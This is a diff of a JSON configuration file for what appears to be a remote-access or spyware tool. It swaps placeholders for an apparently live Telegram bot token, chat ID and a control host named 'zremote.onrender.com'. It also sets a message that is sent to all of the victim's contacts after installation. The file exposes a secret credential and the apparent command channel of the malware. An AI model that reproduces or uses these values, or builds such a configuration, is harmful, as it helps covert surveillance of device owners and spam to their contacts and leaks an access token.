@@ -1,6 +1,6 @@
 {
-    "token": "your bot token",
-    "id": "your telegram chat id here",
-    "host": "your render.com url here must use / after writing url ex: https://google.com/",
+    "token": "8068437739:AAF7xuPAMsReV4U1NSCLU-vGqwC72ynRRVo",
+    "id": "7511874333",
+    "host": "https://zremote.onrender.com/",
     "text": "This line will be sent to all contacts after installation."
 }
